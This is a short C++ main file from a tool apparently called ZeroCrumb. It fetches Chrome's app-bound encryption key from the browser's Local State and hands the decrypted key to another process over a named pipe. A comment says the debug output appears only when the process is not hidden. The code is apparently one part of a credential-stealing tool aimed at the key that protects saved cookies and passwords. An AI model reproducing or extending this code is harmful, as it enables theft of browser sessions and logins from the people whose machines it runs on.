#include <iostream>
#include "./src/dumper/dumper.h"
#include "./src/comm/comm.h"
#include "./src/utils/utils.h"

int main()
{   
    auto browserConf = utils::getBrowserConfig();

    wstring path = browserConf.localState;
    PBYTE key = dumper::getAppBoundKey(dumper::configs::chrome, path);

    // only shows if process isn't hidden / directly running the dumper
    if (!key)
        printf("[DEBUG] Failed To Fetch Key.\n");
    else
        printf("[DEBUG] Decrypted Key Address: 0x%p\n", key);

    if (key) {

        auto pipe = comm::createPipe();

        comm::waitUntilConnected(pipe);

        if (comm::writeAppBoundKey(pipe, key)) {
            MessageBoxW(
                NULL,
                L"Wrote Key To Named Pipe!",
                L"ZeroCrumb",
                MB_ICONEXCLAMATION
            );
        }
    }

    return 0;
}